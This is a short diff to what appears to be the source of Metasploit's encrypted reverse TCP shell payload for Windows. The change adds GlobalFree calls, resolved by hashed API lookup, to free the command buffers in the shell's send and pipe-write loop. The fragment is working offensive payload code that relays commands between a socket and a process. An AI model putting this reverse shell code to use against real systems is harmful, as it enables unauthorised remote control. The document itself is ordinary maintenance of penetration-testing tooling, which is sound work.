@@ -241,6 +241,7 @@ module Payload::Windows::EncryptedReverseTcp
         FuncWriteFile WriteFile = (FuncWriteFile) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'WriteFile')}); // hash('kernel32.dll', 'WriteFile') -> 0x5bae572d
         FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'ExitProcess')}); // hash('kernel32.dll', 'ExitProcess') -> 0x56a2b5f0
         FuncPeekNamedPipe PeekNamedPipe = (FuncPeekNamedPipe) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'PeekNamedPipe')}); // hash('kernel32.dll', 'PeekNamedPipe') -> 0xb33cb718
+        FuncGlobalFree GlobalFree = (FuncGlobalFree) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalFree')});
 
         SecureZeroMemory(buf, buf_size);
         UINT term_stat = ExitProc();
@@ -257,7 +258,8 @@ module Payload::Windows::EncryptedReverseTcp
             //SendData(s, buf, bytes_received, 0);
             SendData(s, cmd, bytes_received, 0);
             SecureZeroMemory(buf, buf_size);
-            // free
+            // GlobalFree
+            GlobalFree(cmd);
           }
           else
           {
@@ -270,7 +272,7 @@ module Payload::Windows::EncryptedReverseTcp
               //WriteFile(in, buf, bytes_received, &bytes_written, NULL);
               WriteFile(in, dec_cmd, bytes_received, &bytes_written, NULL);
               SecureZeroMemory(buf, buf_size);
-              // free
+              GlobalFree(dec_cmd);
             }
           }
           Sleep(100);
